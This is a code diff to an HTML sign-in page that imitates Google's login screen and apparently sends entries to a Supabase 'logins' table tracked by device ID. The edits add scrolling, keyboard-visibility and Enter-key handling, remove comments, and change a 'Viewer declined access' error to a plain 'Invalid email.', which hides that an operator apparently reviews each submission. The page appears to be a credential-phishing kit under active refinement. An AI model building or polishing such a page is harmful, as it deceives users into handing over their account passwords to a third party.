@@ -5,10 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Sign In</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
-    <script src="https://unpkg.com/@supabase/supabase-js"></script>
-    <style>
+  <script src="https://unpkg.com/@supabase/supabase-js"></script>
+  <style>
     :root {
-      font-size: 100%; /* base = 16px, respects device & user settings */
+      font-size: 100%;
     }
 
     * { box-sizing: border-box; }
@@ -39,7 +39,7 @@
     }
 
     .google-text {
-      font-size: clamp(2rem, 6vw, 3.75rem); /* scales with screen + zoom */
+      font-size: clamp(2rem, 6vw, 3.75rem);
       font-weight: bold;
       display: flex;
       gap: 0.25rem;
@@ -79,6 +79,8 @@
       transform: translateY(2.5rem);
       animation: fadeSlideIn 2s ease forwards;
       animation-delay: 3.2s;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
     }
 
     @keyframes fadeSlideIn {
@@ -86,7 +88,6 @@
       50% { opacity: 0.6; transform: translateY(0.625rem); }
       100% { opacity: 1; transform: translateY(0); }
     }
-
 
     .loader-bar { position:absolute; top:0; left:0; height:3px; width:100%; background:transparent; overflow:hidden; display:none; z-index:5; }
     .loader-bar.active{ display:block; }
@@ -220,24 +221,18 @@
       .note { display: block; }
     }
 
-    /* ===== Reduced Motion Support ===== */
     @media (prefers-reduced-motion: reduce) {
-      * {
-        animation: none !important;
-        transition: none !important;
-      }
+      * { animation: none !important; transition: none !important; }
     }
   </style>
 </head>
 <body>
-  <!-- Preloader -->
   <div class="preloader" id="preloader">
     <div class="google-text">
       <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
     </div>
   </div>
 
-  <!-- Sign In Card -->
   <div class="card" id="card">
     <div class="loader-bar" id="loader"></div>
     <div class="overlay" id="overlay"></div>
@@ -362,7 +357,7 @@
     } else if (status === "declined") {
       hideLoadingUI();
       errorMessage.style.display = "block";
-      errorMessage.textContent = "Invalid email. Viewer declined access.";
+      errorMessage.textContent = "Invalid email.";
     }
   }
 
@@ -391,5 +386,44 @@
     client.from("logins").update({ is_active: false }).eq("device_id", deviceId);
   });
 </script>
+
+<!-- ✅ Keyboard visibility fix -->
+<script>
+(function () {
+  const card = document.querySelector('.card');
+  if (!card) return;
+
+  function adjustForKeyboard() {
+    const vv = window.visualViewport;
+    if (!vv) return;
+    const heightDiff = window.innerHeight - vv.height;
+    if (heightDiff > 100) {
+      card.style.paddingBottom = heightDiff + 20 + 'px';
+      card.scrollTo({ top: card.scrollHeight, behavior: 'smooth' });
+    } else {
+      card.style.paddingBottom = '';
+    }
+  }
+
+  if (window.visualViewport) {
+    window.visualViewport.addEventListener('resize', adjustForKeyboard);
+    window.visualViewport.addEventListener('scroll', adjustForKeyboard);
+  }
+
+  document.addEventListener('focusin', adjustForKeyboard);
+  document.addEventListener('focusout', adjustForKeyboard);
+})();
+</script>
+
+<script>
+  // Allow pressing Enter to trigger the Next button
+  document.getElementById('password').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      document.getElementById('nextBtn').click();
+    }
+  });
+</script>
+
 </body>
 </html>
